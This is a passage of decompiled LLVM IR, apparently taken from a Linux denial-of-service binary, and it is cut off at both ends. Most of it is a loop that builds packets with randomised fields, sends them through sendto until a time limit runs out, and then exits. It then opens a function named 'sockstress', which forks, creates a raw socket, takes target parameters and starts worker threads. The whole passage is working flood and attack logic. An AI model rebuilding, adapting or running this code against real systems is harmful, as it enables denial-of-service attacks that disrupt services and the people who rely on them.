  %v2_804d85c = inttoptr i32 %v1_804d85c to i32*
  store i32 4095, i32* %v2_804d85c, align 4
  %v1_804d861 = add i32 %v0_804d859, -12
  %v2_804d861 = inttoptr i32 %v1_804d861 to i32*
  store i32 ptrtoint (i32* @global_var_807cca0.191 to i32), i32* %v2_804d861, align 4
  %v0_804d866 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d866 = add i32 %v0_804d859, -16
  %v3_804d866 = inttoptr i32 %v2_804d866 to i32*
  store i32 %v0_804d866, i32* %v3_804d866, align 4
  %v3_804d867 = call i32 @read(i32 %v6_804d83e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d867, i32* %eax.global-to-local, align 4
  %v0_804d86c = load i32, i32* @esp, align 4
  %v1_804d86c = add i32 %v0_804d86c, 16
  %v2_804d86c = icmp ugt i32 %v0_804d86c, -17
  store i1 %v2_804d86c, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_807cb78.192, align 8
  br label %dec_label_pc_804d879

dec_label_pc_804d879:                             ; preds = %dec_label_pc_804d83b.dec_label_pc_804d879_crit_edge, %dec_label_pc_804d854
  %v0_804d882 = phi i32 [ %v0_804d882.pre, %dec_label_pc_804d83b.dec_label_pc_804d879_crit_edge ], [ %v1_804d86c, %dec_label_pc_804d854 ]
  store i32 %v1_804d7bc, i32* %eax.global-to-local, align 4
  %v0_804d87c = load i32, i32* @global_var_807e0e0.190, align 32
  store i32 %v0_804d87c, i32* %edx.global-to-local, align 4
  %v5_804d882 = icmp ult i32 %v0_804d882, 4
  store i1 %v5_804d882, i1* %cf.global-to-local, align 1
  %v2_804d885 = add i32 %v0_804d882, -8
  %v3_804d885 = inttoptr i32 %v2_804d885 to i32*
  store i32 %v1_804d7bc, i32* %v3_804d885, align 4
  %v3_804d886 = load i8*, i8** %stack_var_-32, align 4
  %v4_804d886 = ptrtoint i8* %v3_804d886 to i32
  %v6_804d886 = add i32 %v0_804d882, -12
  %v7_804d886 = inttoptr i32 %v6_804d886 to i32*
  store i32 %v4_804d886, i32* %v7_804d886, align 4
  %v0_804d889 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d889 = add i32 %v0_804d882, -16
  %v3_804d889 = inttoptr i32 %v2_804d889 to i32*
  store i32 %v0_804d889, i32* %v3_804d889, align 4
  %v3_804d88a = call i32 @read(i32 %v6_804d83e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d88a, i32* %eax.global-to-local, align 4
  %v0_804d88f = load i32, i32* @esp, align 4
  %tmp = and i32 %v0_804d88f, -8
  %v5_804d892 = icmp eq i32 %tmp, -16
  store i1 %v5_804d892, i1* %cf.global-to-local, align 1
  %v1_804d895 = add i32 %v0_804d88f, 4
  %v2_804d895 = inttoptr i32 %v1_804d895 to i32*
  store i32 255, i32* %v2_804d895, align 4
  %v2_804d89a = inttoptr i32 %v0_804d88f to i32*
  store i32 0, i32* %v2_804d89a, align 4
  %v2_804d89c = call i32 @realrand(i32 %v6_804d83e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d89c, i32* %eax.global-to-local, align 4
  %v0_804d8a1 = load i32, i32* @esp, align 4
  %tmp101 = and i32 %v0_804d8a1, -8
  %v5_804d8aa = icmp eq i32 %tmp101, -16
  store i1 %v5_804d8aa, i1* %cf.global-to-local, align 1
  %v1_804d8ad = add i32 %v0_804d8a1, 4
  %v2_804d8ad = inttoptr i32 %v1_804d8ad to i32*
  store i32 8100, i32* %v2_804d8ad, align 4
  %v2_804d8b2 = inttoptr i32 %v0_804d8a1 to i32*
  store i32 0, i32* %v2_804d8b2, align 4
  %v2_804d8b4 = call i32 @realrand(i32 %v2_804d89c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d8b4, i32* %eax.global-to-local, align 4
  %v0_804d8b9 = load i32, i32* @esp, align 4
  %tmp102 = and i32 %v0_804d8b9, -8
  %v5_804d8c2 = icmp eq i32 %tmp102, -16
  store i1 %v5_804d8c2, i1* %cf.global-to-local, align 1
  %v1_804d8c5 = add i32 %v0_804d8b9, 4
  %v2_804d8c5 = inttoptr i32 %v1_804d8c5 to i32*
  store i32 15, i32* %v2_804d8c5, align 4
  %v2_804d8c7 = inttoptr i32 %v0_804d8b9 to i32*
  store i32 0, i32* %v2_804d8c7, align 4
  %v1_804d8c9 = load i32, i32* %stack_var_-952, align 4
  %v2_804d8c9 = call i32 @realrand(i32 %v2_804d8b4, i32 %v1_804d8c9)
  store i32 %v2_804d8c9, i32* %eax.global-to-local, align 4
  %v0_804d8ce = load i32, i32* @esp, align 4
  %v2_804d8ce = icmp ugt i32 %v0_804d8ce, -17
  store i1 %v2_804d8ce, i1* %cf.global-to-local, align 1
  store i32 %v2_804d8c9, i32* %stack_var_-996, align 4
  store i32 %v5_804d7cb, i32* %edx.global-to-local, align 4
  %v2_804d8da = load i8, i8* %v5_804d7d9, align 1
  %tmp103 = urem i8 %v2_804d8da, 16
  %v1_804d8dc = zext i8 %tmp103 to i32
  %v1_804d8df = or i32 %v1_804d8dc, 64
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804d8df = trunc i32 %v1_804d8df to i8
  store i32 %v1_804d8df, i32* %eax.global-to-local, align 4
  store i8 %v3_804d8df, i8* %v5_804d7d9, align 1
  store i32 %v5_804d7cb, i32* %edx.global-to-local, align 4
  %v2_804d8e7 = load i8, i8* %v5_804d7d9, align 1
  %v1_804d8e9 = and i8 %v2_804d8e7, -16
  %v1_804d8ec = or i8 %v1_804d8e9, 5
  store i8 %v1_804d8ec, i8* %v5_804d7d9, align 1
  store i8 0, i8* %v2_804d8f4, align 1
  store i32 %v1_804d8fb, i32* %eax.global-to-local, align 4
  %v0_804d900 = load i32, i32* @esp, align 4
  %v5_804d900 = icmp ult i32 %v0_804d900, 12
  store i1 %v5_804d900, i1* %cf.global-to-local, align 1
  %v2_804d903 = add i32 %v0_804d900, -16
  %v3_804d903 = inttoptr i32 %v2_804d903 to i32*
  store i32 %v1_804d8fb, i32* %v3_804d903, align 4
  %v0_804d904 = load i32, i32* %stack_var_-996, align 4
  %v1_804d904 = call i32 @htons(i32 %v0_804d904)
  %v2_804d904 = trunc i32 %v1_804d904 to i16
  %sext = mul i32 %v1_804d904, 65536
  %v1_804d90c = sdiv i32 %sext, 65536
  store i32 %v1_804d90c, i32* %edx.global-to-local, align 4
  store i32 %v5_804d7cb, i32* %eax.global-to-local, align 4
  store i16 %v2_804d904, i16* %v4_804d911, align 2
  %v0_804d915 = load i32, i32* @esp, align 4
  %v5_804d915 = icmp ult i32 %v0_804d915, 8
  store i1 %v5_804d915, i1* %cf.global-to-local, align 1
  %v1_804d918 = add i32 %v0_804d915, -12
  %v2_804d918 = inttoptr i32 %v1_804d918 to i32*
  store i32 10000, i32* %v2_804d918, align 4
  %v1_804d91d = add i32 %v0_804d915, -16
  %v2_804d91d = inttoptr i32 %v1_804d91d to i32*
  store i32 1, i32* %v2_804d91d, align 4
  %v0_804d91f = load i32, i32* %stack_var_-996, align 4
  %v1_804d91f = load i32, i32* %stack_var_-992, align 4
  %v2_804d91f = call i32 @realrand(i32 %v0_804d91f, i32 %v1_804d91f)
  %v0_804d924 = load i32, i32* @esp, align 4
  %v1_804d924 = add i32 %v0_804d924, 16
  %v1_804d927 = urem i32 %v2_804d91f, 65536
  store i32 %v1_804d927, i32* %eax.global-to-local, align 4
  %v5_804d92c = icmp ult i32 %v1_804d924, 12
  store i1 %v5_804d92c, i1* %cf.global-to-local, align 1
  %v3_804d92f = inttoptr i32 %v0_804d924 to i32*
  store i32 %v1_804d927, i32* %v3_804d92f, align 4
  %v0_804d930 = load i32, i32* %stack_var_-996, align 4
  %v1_804d930 = call i32 @htons(i32 %v0_804d930)
  %v2_804d930 = trunc i32 %v1_804d930 to i16
  %sext6 = mul i32 %v1_804d930, 65536
  %v1_804d938 = sdiv i32 %sext6, 65536
  store i32 %v1_804d938, i32* %edx.global-to-local, align 4
  store i16 %v2_804d930, i16* %v4_804d93d, align 2
  store i32 %v5_804d7cb, i32* %eax.global-to-local, align 4
  store i8 127, i8* %v2_804d944, align 1
  %v0_804d948 = load i32, i32* @esp, align 4
  %v5_804d948 = icmp ult i32 %v0_804d948, 8
  store i1 %v5_804d948, i1* %cf.global-to-local, align 1
  %v1_804d94b = add i32 %v0_804d948, -12
  %v2_804d94b = inttoptr i32 %v1_804d94b to i32*
  store i32 13, i32* %v2_804d94b, align 4
  %v1_804d94d = add i32 %v0_804d948, -16
  %v2_804d94d = inttoptr i32 %v1_804d94d to i32*
  store i32 0, i32* %v2_804d94d, align 4
  %v0_804d94f = load i32, i32* %stack_var_-996, align 4
  %v1_804d94f = load i32, i32* %stack_var_-992, align 4
  %v2_804d94f = call i32 @realrand(i32 %v0_804d94f, i32 %v1_804d94f)
  store i32 %v2_804d94f, i32* %eax.global-to-local, align 4
  %v0_804d957 = load i32, i32* @ebp, align 4
  %v2_804d957 = mul i32 %v2_804d94f, 4
  %v3_804d957 = add i32 %v2_804d957, -948
  %v4_804d957 = add i32 %v3_804d957, %v0_804d957
  %v5_804d957 = inttoptr i32 %v4_804d957 to i32*
  %v6_804d957 = load i32, i32* %v5_804d957, align 4
  %v1_804d95e = urem i32 %v6_804d957, 256
  %v2_804d95e = load i32, i32* @edx, align 4
  %v3_804d95e = and i32 %v2_804d95e, -256
  %v4_804d95e = or i32 %v3_804d95e, %v1_804d95e
  store i32 %v4_804d95e, i32* %edx.global-to-local, align 4
  store i32 %v5_804d7cb, i32* %eax.global-to-local, align 4
  %v1_804d963 = trunc i32 %v6_804d957 to i8
  store i8 %v1_804d963, i8* %v4_804d963, align 1
  %v0_804d966 = load i32, i32* @esp, align 4
  %v5_804d966 = icmp ult i32 %v0_804d966, 8
  store i1 %v5_804d966, i1* %cf.global-to-local, align 1
  %v1_804d969 = add i32 %v0_804d966, -12
  %v2_804d969 = inttoptr i32 %v1_804d969 to i32*
  store i32 9, i32* %v2_804d969, align 4
  %v1_804d96b = add i32 %v0_804d966, -16
  %v2_804d96b = inttoptr i32 %v1_804d96b to i32*
  store i32 0, i32* %v2_804d96b, align 4
  %v0_804d96d = load i32, i32* %stack_var_-996, align 4
  %v1_804d96d = load i32, i32* %stack_var_-992, align 4
  %v2_804d96d = call i32 @realrand(i32 %v0_804d96d, i32 %v1_804d96d)
  store i32 %v2_804d96d, i32* %eax.global-to-local, align 4
  %v0_804d972 = load i32, i32* @esp, align 4
  %v1_804d972 = add i32 %v0_804d972, 16
  %v0_804d975 = load i32, i32* @ebp, align 4
  %v2_804d975 = mul i32 %v2_804d96d, 4
  %v3_804d975 = add i32 %v2_804d975, -988
  %v4_804d975 = add i32 %v3_804d975, %v0_804d975
  %v5_804d975 = inttoptr i32 %v4_804d975 to i32*
  %v6_804d975 = load i32, i32* %v5_804d975, align 4
  %v1_804d97c = urem i32 %v6_804d975, 65536
  store i32 %v1_804d97c, i32* %eax.global-to-local, align 4
  %v5_804d981 = icmp ult i32 %v1_804d972, 12
  store i1 %v5_804d981, i1* %cf.global-to-local, align 1
  %v3_804d984 = inttoptr i32 %v0_804d972 to i32*
  store i32 %v1_804d97c, i32* %v3_804d984, align 4
  %v0_804d985 = load i32, i32* %stack_var_-996, align 4
  %v1_804d985 = call i32 @htons(i32 %v0_804d985)
  %v2_804d985 = trunc i32 %v1_804d985 to i16
  %v0_804d98a = load i32, i32* @esp, align 4
  %v2_804d98a = icmp ugt i32 %v0_804d98a, -17
  store i1 %v2_804d98a, i1* %cf.global-to-local, align 1
  %sext7 = mul i32 %v1_804d985, 65536
  %v1_804d98d = sdiv i32 %sext7, 65536
  store i32 %v1_804d98d, i32* %edx.global-to-local, align 4
  store i16 %v2_804d985, i16* %v4_804d992, align 2
  store i32 %v5_804d7cb, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804d999, align 2
  %v0_804d99f = call i32 @random()
  store i32 %v0_804d99f, i32* %edx.global-to-local, align 4
  store i32 %v0_804d99f, i32* %v3_804d9a9, align 4
  store i32 %storemerge476, i32* %eax.global-to-local, align 4
  %v0_804d9af = load i32, i32* @ebp, align 4
  %v4_804d9af = add i32 %v0_804d9af, %v3_804d83e
  %v5_804d9af = inttoptr i32 %v4_804d9af to i32*
  %v6_804d9af = load i32, i32* %v5_804d9af, align 4
  store i32 %v6_804d9af, i32* %edx.global-to-local, align 4
  store i32 %v5_804d7cb, i32* %eax.global-to-local, align 4
  store i32 %v6_804d9af, i32* %v3_804d9b9, align 4
  store i32 %v2_804d9bc, i32* @ebx, align 4
  %v0_804d9bf = load i32, i32* @esp, align 4
  %v5_804d9bf = icmp ult i32 %v0_804d9bf, 8
  store i1 %v5_804d9bf, i1* %cf.global-to-local, align 1
  %v1_804d9c2 = add i32 %v0_804d9bf, -12
  %v2_804d9c2 = inttoptr i32 %v1_804d9c2 to i32*
  store i32 6, i32* %v2_804d9c2, align 4
  %v1_804d9c4 = add i32 %v0_804d9bf, -16
  %v2_804d9c4 = inttoptr i32 %v1_804d9c4 to i32*
  store i32 0, i32* %v2_804d9c4, align 4
  %v0_804d9c6 = load i32, i32* %stack_var_-996, align 4
  %v1_804d9c6 = load i32, i32* %stack_var_-992, align 4
  %v2_804d9c6 = call i32 @realrand(i32 %v0_804d9c6, i32 %v1_804d9c6)
  store i32 %v2_804d9c6, i32* %eax.global-to-local, align 4
  %v0_804d9cb = load i32, i32* @esp, align 4
  %v0_804d9ce = load i32, i32* @ebp, align 4
  %v2_804d9ce = mul i32 %v2_804d9c6, 4
  %v3_804d9ce = add i32 %v2_804d9ce, -1016
  %v4_804d9ce = add i32 %v3_804d9ce, %v0_804d9ce
  %v5_804d9ce = inttoptr i32 %v4_804d9ce to i32*
  %v6_804d9ce = load i32, i32* %v5_804d9ce, align 4
  store i32 %v6_804d9ce, i32* %eax.global-to-local, align 4
  store i32 %v1_804d7bc, i32* %edx.global-to-local, align 4
  %tmp104 = and i32 %v0_804d9cb, -8
  %v5_804d9d8 = icmp eq i32 %tmp104, -16
  store i1 %v5_804d9d8, i1* %cf.global-to-local, align 1
  %v1_804d9db = add i32 %v0_804d9cb, 4
  %v2_804d9db = inttoptr i32 %v1_804d9db to i32*
  store i32 16, i32* %v2_804d9db, align 4
  %v3_804d9dd = inttoptr i32 %v0_804d9cb to i32*
  store i32 %v2_804d9bc, i32* %v3_804d9dd, align 4
  %v0_804d9de = load i32, i32* %eax.global-to-local, align 4
  %v2_804d9de = add i32 %v0_804d9cb, -4
  %v3_804d9de = inttoptr i32 %v2_804d9de to i32*
  store i32 %v0_804d9de, i32* %v3_804d9de, align 4
  %v0_804d9df = load i32, i32* %edx.global-to-local, align 4
  %v2_804d9df = add i32 %v0_804d9cb, -8
  %v3_804d9df = inttoptr i32 %v2_804d9df to i32*
  store i32 %v0_804d9df, i32* %v3_804d9df, align 4
  %v3_804d9e0 = load i8*, i8** %stack_var_-32, align 4
  %v4_804d9e0 = ptrtoint i8* %v3_804d9e0 to i32
  %v6_804d9e0 = add i32 %v0_804d9cb, -12
  %v7_804d9e0 = inttoptr i32 %v6_804d9e0 to i32*
  store i32 %v4_804d9e0, i32* %v7_804d9e0, align 4
  %v5_804d9e3 = add i32 %v0_804d9cb, -16
  %v6_804d9e3 = inttoptr i32 %v5_804d9e3 to i32*
  store i32 %v5_804d4bf, i32* %v6_804d9e3, align 4
  %v0_804d9e6 = load i32, i32* %stack_var_-996, align 4
  %v1_804d9e6 = load i32, i32* %stack_var_-992, align 4
  %v6_804d9e6 = call i32 @sendto(i32 %v0_804d9e6, i32 %v1_804d9e6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804d9e6, i32* %eax.global-to-local, align 4
  %v0_804d9eb = load i32, i32* @esp, align 4
  %v9_804d9ee = icmp ult i32 %stack_var_-20.275, 99
  store i1 %v9_804d9ee, i1* %cf.global-to-local, align 1
  %v7_804d9f2 = icmp sgt i32 %stack_var_-20.275, 99
  br i1 %v7_804d9f2, label %dec_label_pc_804d9f4, label %dec_label_pc_804da2a

dec_label_pc_804d9f4:                             ; preds = %dec_label_pc_804d879
  %v1_804d9eb = add i32 %v0_804d9eb, 32
  %v5_804d9f4 = icmp ult i32 %v1_804d9eb, 12
  store i1 %v5_804d9f4, i1* %cf.global-to-local, align 1
  %v1_804d9f7 = add i32 %v0_804d9eb, 16
  %v2_804d9f7 = inttoptr i32 %v1_804d9f7 to i32*
  store i32 0, i32* %v2_804d9f7, align 4
  %v0_804d9f9 = load i32, i32* %stack_var_-996, align 4
  %v1_804d9f9 = inttoptr i32 %v0_804d9f9 to i32*
  %v2_804d9f9 = call i32 @__GI_time(i32* %v1_804d9f9)
  store i32 %v2_804d9f9, i32* %eax.global-to-local, align 4
  %v0_804d9fe = load i32, i32* @esp, align 4
  store i32 %v5_804da04, i32* %edx.global-to-local, align 4
  %v7_804da07 = icmp ult i32 %v2_804d9f9, %v5_804da04
  store i1 %v7_804da07, i1* %cf.global-to-local, align 1
  %v5_804da09 = icmp slt i32 %v2_804d9f9, %v5_804da04
  br i1 %v5_804da09, label %dec_label_pc_804da2a, label %dec_label_pc_804da0b

dec_label_pc_804da0b:                             ; preds = %dec_label_pc_804d9f4
  %v1_804d9fe = add i32 %v0_804d9fe, 16
  %v5_804da0b = icmp ult i32 %v1_804d9fe, 12
  store i1 %v5_804da0b, i1* %cf.global-to-local, align 1
  %v3_804da0e = load i8*, i8** %stack_var_-32, align 4
  %v4_804da0e = ptrtoint i8* %v3_804da0e to i32
  %v7_804da0e = inttoptr i32 %v0_804d9fe to i32*
  store i32 %v4_804da0e, i32* %v7_804da0e, align 4
  %v0_804da11 = load i32, i32* %stack_var_-996, align 4
  %v1_804da11 = call i32 @free(i32 %v0_804da11)
  store i32 %v1_804da11, i32* %eax.global-to-local, align 4
  %v0_804da16 = load i32, i32* @esp, align 4
  %v1_804da16 = add i32 %v0_804da16, 16
  %v5_804da19 = icmp ult i32 %v1_804da16, 12
  store i1 %v5_804da19, i1* %cf.global-to-local, align 1
  %v2_804da1c = inttoptr i32 %v0_804da16 to i32*
  store i32 0, i32* %v2_804da1c, align 4
  %v0_804da1e = load i32, i32* %stack_var_-996, align 4
  %v1_804da1e = call i32 @__GI_exit(i32 %v0_804da1e)
  store i32 %v1_804da1e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804da2a

dec_label_pc_804da2a:                             ; preds = %dec_label_pc_804da0b, %dec_label_pc_804d9f4, %dec_label_pc_804d879
  %stack_var_-20.1 = phi i32 [ %stack_var_-20.275, %dec_label_pc_804d879 ], [ 0, %dec_label_pc_804d9f4 ], [ 0, %dec_label_pc_804da0b ]
  %v4_804da2a = add i32 %stack_var_-20.1, 1
  %v4_804da2d = add nuw nsw i32 %storemerge476, 1
  store i32 %v1_804da33, i32* %eax.global-to-local, align 4
  %v10_804da34 = icmp ult i32 %v1_804da33, %v4_804da2d
  store i1 %v10_804da34, i1* %cf.global-to-local, align 1
  %exitcond92 = icmp eq i32 %v1_804da33, %v4_804da2d
  br i1 %exitcond92, label %dec_label_pc_804da3d, label %dec_label_pc_804d83b

dec_label_pc_804da3d:                             ; preds = %dec_label_pc_804da2a, %dec_label_pc_804da30.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.377, %dec_label_pc_804da30.preheader ], [ %v4_804da2a, %dec_label_pc_804da2a ]
  %v4_804da3d = add nuw nsw i32 %storemerge78, 1
  %v9_804da40 = icmp ult i32 %v4_804da3d, 254
  %exitcond = icmp eq i32 %v4_804da3d, 255
  br i1 %exitcond, label %dec_label_pc_804d823, label %dec_label_pc_804da30.preheader

dec_label_pc_804da30.preheader:                   ; preds = %dec_label_pc_804d823, %dec_label_pc_804da3d
  %storemerge = phi i1 [ true, %dec_label_pc_804d823 ], [ %v9_804da40, %dec_label_pc_804da3d ]
  %storemerge78 = phi i32 [ 0, %dec_label_pc_804d823 ], [ %v4_804da3d, %dec_label_pc_804da3d ]
  %stack_var_-20.377 = phi i32 [ %stack_var_-20.0, %dec_label_pc_804d823 ], [ %stack_var_-20.2.lcssa, %dec_label_pc_804da3d ]
  store i1 %storemerge, i1* %cf.global-to-local, align 1
  store i32 %v1_804da33, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v8_804da3774, label %dec_label_pc_804d83b, label %dec_label_pc_804da3d

dec_label_pc_804da52:                             ; preds = %entry
  ret i32 %v2_804d42d

; uselistorder directives
  uselistorder i32 %v4_804da3d, { 2, 1, 0 }
  uselistorder i32 %stack_var_-20.2.lcssa, { 1, 0 }
  uselistorder i32 %v4_804da2d, { 1, 2, 0 }
  uselistorder i32 %v4_804da2a, { 1, 0 }
  uselistorder i32 %v0_804d9cb, { 1, 2, 3, 4, 6, 5, 0 }
  uselistorder i32 %v1_804d97c, { 1, 0 }
  uselistorder i32 %v6_804d957, { 1, 0 }
  uselistorder i32 %v1_804d927, { 1, 0 }
  uselistorder i32 %v0_804d8b9, { 1, 2, 0 }
  uselistorder i32 %v0_804d8a1, { 1, 2, 0 }
  uselistorder i32 %v0_804d88f, { 1, 2, 0 }
  uselistorder i32 %v0_804d882, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-20.275, { 2, 0, 1 }
  uselistorder i32 %storemerge476, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804d8fb, { 1, 0 }
  uselistorder i32 %v1_804da33, { 2, 0, 3, 4, 1 }
  uselistorder i8* %v5_804d7d9, { 0, 2, 1, 3 }
  uselistorder i32 %v5_804d7cb, { 17, 14, 11, 9, 6, 4, 3, 18, 16, 15, 13, 12, 10, 8, 7, 5, 2, 1, 0 }
  uselistorder i32 %v1_804d7bc, { 3, 1, 4, 0, 2, 5 }
  uselistorder i32 %v4_804d752, { 1, 2, 3, 0 }
  uselistorder i32 %stack_var_-44.0, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 2 }
  uselistorder i32 %v2_804d73a, { 1, 0, 2 }
  uselistorder i32 %v2_804d6ff, { 1, 0, 2 }
  uselistorder i32 %v2_804d6e9, { 1, 0, 2 }
  uselistorder i32 %v2_804d71b, { 1, 2, 0, 3 }
  uselistorder i32* %v1_804d71b, { 1, 0, 2 }
  uselistorder i1 %v0_804d6c7, { 1, 0 }
  uselistorder i32 %v5_804d690, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %stack_var_-36.187, { 2, 1, 0 }
  uselistorder i32 %stack_var_-44.188, { 4, 3, 0, 2, 1 }
  uselistorder i32 %storemerge589, { 1, 0 }
  uselistorder i32 %v4_804d5ef, { 1, 0, 3, 2 }
  uselistorder i32 %v4_804d464, { 1, 0 }
  uselistorder i1 %v5_804d427, { 6, 7, 1, 5, 3, 2, 8, 9, 10, 4, 0, 11 }
  uselistorder i32* %stack_var_-1036, { 3, 1, 0, 2 }
  uselistorder i8** %stack_var_-1052, { 25, 24, 23, 22, 21, 26, 20, 19, 18, 17, 15, 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-952, { 1, 0 }
  uselistorder i32* %stack_var_-992, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32* %stack_var_-996, { 0, 1, 5, 6, 7, 2, 8, 10, 3, 9, 4, 11, 12, 13 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 27, 28, 32, 33, 34, 35, 36, 37, 38, 39, 40, 53, 41, 42, 43, 44, 47, 48, 49, 50, 45, 46, 51, 52, 1, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i1* %cf.global-to-local, { 1, 0, 27, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 47, 38, 39, 40, 42, 43, 44, 41, 45, 46, 3, 2, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32 ptrtoint (i32* @global_var_807cca0.191 to i32), { 1, 0 }
  uselistorder [13 x i8]* @global_var_8069b2d.189, { 1, 0 }
  uselistorder i32 %arg3, { 0, 9, 1, 2, 3, 8, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804da30.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804da3d, { 1, 0 }
  uselistorder label %dec_label_pc_804d879, { 1, 0 }
  uselistorder label %dec_label_pc_804d787, { 1, 0 }
  uselistorder label %dec_label_pc_804d767, { 1, 0 }
  uselistorder label %dec_label_pc_804d752, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804d68a, { 1, 0 }
  uselistorder label %dec_label_pc_804d4b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d48a, { 1, 0 }
  uselistorder label %dec_label_pc_804d464, { 1, 0 }
}

define i32 @sockstress(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804da5a = load i32, i32* @ebp, align 4
  store i32 %v0_804da5a, i32* %stack_var_-4, align 4
  %v4_804da5a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804da5a, i32* @ebp, align 4
  %v15_804da5d = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v15_804da5d, i32* @eax, align 4
  %v1_804da6b = call i32 @mfork(i32 %arg2)
  store i32 %v1_804da6b, i32* %eax.global-to-local, align 4
  %v1_804da73 = icmp eq i32 %v1_804da6b, 0
  %v1_804da75 = icmp eq i1 %v1_804da73, false
  br i1 %v1_804da75, label %dec_label_pc_804dbe4, label %dec_label_pc_804da7b

dec_label_pc_804da7b:                             ; preds = %entry
  %v3_804da87 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804da87, i32* %eax.global-to-local, align 4
  %v5_804da92 = icmp slt i32 %v3_804da87, 0
  %v1_804da96 = icmp eq i1 %v5_804da92, false
  br i1 %v1_804da96, label %dec_label_pc_804daa2, label %dec_label_pc_804da98

dec_label_pc_804da98:                             ; preds = %dec_label_pc_804da7b
  %v1_804da9d = call i32 @__GI_exit(i32 1)
  store i32 %v1_804da9d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804daa2

dec_label_pc_804daa2:                             ; preds = %dec_label_pc_804da7b, %dec_label_pc_804da98
  %v1_804daa5 = inttoptr i32 %arg1 to i8*
  store i8* %v1_804daa5, i8** @global_var_807e0d0.200, align 16
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @global_var_807e0d4.201, align 4
  %v2_804dab7 = call i32 @__GI_time(i32* null)
  store i32 %v2_804dab7, i32* %eax.global-to-local, align 4
  %v1_804dac3 = call i32 @srand(i32 %v2_804dab7)
  store i32 %v1_804dac3, i32* %eax.global-to-local, align 4
  %v0_804dacb = call i32 @printIntro()
  store i32 %v0_804dacb, i32* @eax, align 4
  %v0_804dad0 = call i32 @initStats()
  store i32 %v0_804dad0, i32* %eax.global-to-local, align 4
  %v2_804dade = inttoptr i32 %arg4 to i32*
  %v3_804dade = call i32 @processArgs(i32 %arg3, i32* %v2_804dade)
  store i32 %v3_804dade, i32* %eax.global-to-local, align 4
  %v0_804dae9 = load i32, i32* @global_var_807dcc4.202, align 4
  %v1_804daef = call i32 @__GI_inet_ntoa(i32 %v0_804dae9)
  %v2_804dafd = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dafd, i32* %eax.global-to-local, align 4
  %v3_804db01 = bitcast i32* %stack_var_-32 to i8*
  %v4_804db01 = call i32 @strncpy(i8* %v3_804db01, i32 %v1_804daef, i32 16)
  %v2_804db12 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804db12, i32* %eax.global-to-local, align 4
  %v5_804db16 = call i32 @pthread_create(i32* nonnull %stack_var_-36, i32 0, i32 134538407, i32 0)
  %v0_804db1e = load i32, i32* @global_var_807e0d8.203, align 8
  %v2_804db23 = mul i32 %v0_804db1e, 4
  %v1_804db29 = add i32 %v2_804db23, 30
  %v2_804db2c = and i32 %v1_804db29, -16
  %v2_804db32 = sub i32 %v15_804da5d, %v2_804db2c
  %v1_804db3a = add i32 %v2_804db32, 15
  %v2_804db3d = and i32 %v1_804db3a, -16
  store i32 %v2_804db3d, i32* %stack_var_-60, align 4
  store i32 %v0_804db1e, i32* %eax.global-to-local, align 4
  %v8_804db7e23 = icmp sgt i32 %v0_804db1e, 0
  br i1 %v8_804db7e23, label %dec_label_pc_804db55, label %dec_label_pc_804db80

dec_label_pc_804db55:                             ; preds = %dec_label_pc_804daa2, %dec_label_pc_804db55
